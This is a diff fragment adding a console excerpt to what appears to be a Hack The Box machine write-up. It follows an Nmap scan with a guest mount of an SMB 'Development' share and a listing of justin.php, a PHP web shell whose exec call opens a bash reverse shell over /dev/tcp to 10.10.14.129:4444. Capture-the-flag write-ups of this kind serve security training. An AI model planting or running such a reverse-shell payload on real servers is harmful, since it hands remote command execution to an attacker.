@@ -324,3 +324,11 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 106.35 seconds
 ```
+```console
+root@kali:~/Desktop/HackTheBox/Machines/123# mount //10.10.10.123/Development ./Devlopment/ -o username=guest
+root@kali:~/Desktop/HackTheBox/Machines/123# cd Devlopment/
+root@kali:~/Desktop/HackTheBox/Machines/123/Devlopment# cat justin.php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.129/4444 0>&1'");
+?>
+```
